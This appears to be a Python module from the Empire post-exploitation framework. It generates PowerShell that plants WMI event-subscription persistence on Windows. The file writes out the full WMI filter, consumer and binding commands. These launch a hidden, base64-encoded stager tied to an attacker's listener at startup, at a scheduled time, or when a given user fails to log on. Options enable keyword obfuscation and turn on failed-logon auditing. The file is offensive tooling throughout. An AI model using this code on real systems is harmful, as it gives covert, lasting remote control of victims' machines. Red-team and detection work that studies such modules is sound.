from pathlib import Path

from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # trigger options
        daily_time = params["DailyTime"]
        day = params["Day"]
        day_of_week = params["DayOfWeek"]
        sub_name = params["SubName"]
        dummy_sub_name = "_" + sub_name
        failed_logon = params["FailedLogon"]

        # management options
        ext_file = params["ExtFile"]
        cleanup = params["Cleanup"]

        # staging options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        status_msg = ""

        if cleanup.lower() == "true":
            # commands to remove the WMI filter and subscription
            script = (
                "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='"
                + sub_name
                + "'\"| Remove-WmiObject;"
            )
            script += (
                "Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='"
                + sub_name
                + "'\" | Remove-WmiObject;"
            )
            script += (
                "Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { $_.filter -match '"
                + sub_name
                + "'} | Remove-WmiObject;"
            )
            script += (
                "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='"
                + dummy_sub_name
                + "'\"| Remove-WmiObject;"
            )
            script += (
                "Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='"
                + dummy_sub_name
                + "'\" | Remove-WmiObject;"
            )
            script += (
                "Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { $_.filter -match '"
                + dummy_sub_name
                + "'} | Remove-WmiObject;"
            )
            script += (
                "'WMI persistence with subscription named " + sub_name + " removed.'"
            )
            script = main_menu.obfuscationv2.obfuscate_keywords(script)

            return main_menu.modulesv2.finalize_module(
                script=script,
                script_end="",
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
            )

        if ext_file != "":
            # read in an external file as the payload and build a
            #   base64 encoded version as encScript
            ext_path = Path(ext_file)
            if ext_path.exists():
                fileData = ext_path.read_text()

                # unicode-base64 encode the script for -enc launching
                enc_script = helpers.enc_powershell(fileData)
                status_msg += "using external file " + ext_file

            else:
                raise ModuleValidationException("File does not exist: " + ext_file)

        elif listener_name == "":
            raise ModuleValidationException(
                "[!] Either an ExtFile or a Listener must be specified"
            )

        # if an external file isn't specified, use a listener
        elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: " + listener_name)

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )

            enc_script = launcher.split(" ")[-1]
            status_msg += "using listener " + listener_name

        # sanity check to make sure we haven't exceeded the powershell -enc 8190 char max
        if len(enc_script) > 8190:
            raise ModuleValidationException(
                "[!] Warning: -enc command exceeds the maximum of 8190 characters."
            )

        # built the command that will be triggered
        trigger_cmd = (
            "$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc "
            + enc_script
        )

        if failed_logon != "":
            # Enable failed logon auditing
            script = "auditpol /set /subcategory:Logon /failure:enable;"

            # create WMI event filter for failed logon
            script += (
                '$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{Name=\''
                + sub_name
                + "';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode='4625' AND TargetInstance.Message LIKE '%"
                + failed_logon
                + "%'\"}; "
            )
            status_msg += " with trigger upon failed logon by " + failed_logon

        elif daily_time != "" or day != "" or day_of_week != "":
            # add DailyTime to event filter
            parts = daily_time.split(":")

            if len(parts) < 2:
                raise ModuleValidationException(
                    "[!] Please use HH:mm format for DailyTime"
                )

            hour = parts[0]
            minutes = parts[1]

            # some presets for building status message and the script
            status_msg_day = " daily"
            day_filter = ""
            script = ""

            # if those day and day_of_week are combined, return nothing for the script
            if day != "" and day_of_week != "":
                raise ModuleValidationException("Can not combine Day and DayOfWeek")

            # add day or day_of_week to event filter
            if day != "":
                if (int(day) < 1) or (int(day) > 31):
                    raise ModuleValidationException(
                        "[!] Please stick to range 1-31 for Day"
                    )
                day_filter = " AND (TargetInstance.Day = " + day + ")"
                status_msg_day = " every day of month: " + day + " (1-31)"

            elif day_of_week != "":
                if (int(day_of_week) < 0) or (int(day_of_week) > 6):
                    raise ModuleValidationException(
                        "[!] Please stick to range 0-6 for DayOfWeek"
                    )
                day_filter = " AND (TargetInstance.DayOfWeek=" + day_of_week + ")"
                status_msg_day = " every day of week: " + day_of_week + " (0-6)"
                # creating and bind a dummy WMI event filter with a "nop event consumer" as workaround for win32_localtime.day_of_week bug
                day_filter_dummy = (
                    " AND (TargetInstance.DayOfWeek="
                    + day_of_week
                    + " OR TargetInstance.DayOfWeek="
                    + str(int(day_of_week) + 1)
                    + ")"
                )
                script += (
                    '$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{name=\''
                    + dummy_sub_name
                    + "';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
                    + day_filter_dummy
                    + " AND (TargetInstance.Hour = "
                    + hour
                    + ") AND (TargetInstance.Minute = "
                    + minutes
                    + ') GROUP WITHIN 60"};'
                )
                script += (
                    "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='"
                    + dummy_sub_name
                    + "';CommandLineTemplate=\"call\";RunInteractively='false'};"
                )
                script += ' Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;'

            # create the real WMI event filter for a system time
            script += (
                '$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{name=\''
                + sub_name
                + "';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
                + day_filter
                + " AND (TargetInstance.Hour = "
                + hour
                + ") AND (TargetInstance.Minute = "
                + minutes
                + ') GROUP WITHIN 60"};'
            )
            status_msg += (
                " with WMI subscription trigger at " + daily_time + status_msg_day + "."
            )

        else:
            # create the WMI event filter for OnStartup
            script = (
                '$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{name=\''
                + sub_name
                + "';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
            )
            status_msg += " with OnStartup WMI subsubscription trigger."

        # add in the event consumer to launch the encrypted script contents
        script += (
            "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='"
            + sub_name
            + "';CommandLineTemplate=\""
            + trigger_cmd
            + "\";RunInteractively='false'};"
        )

        # bind the filter and event consumer together
        script += ' Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;'

        script += "'WMI persistence established " + status_msg + "'"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
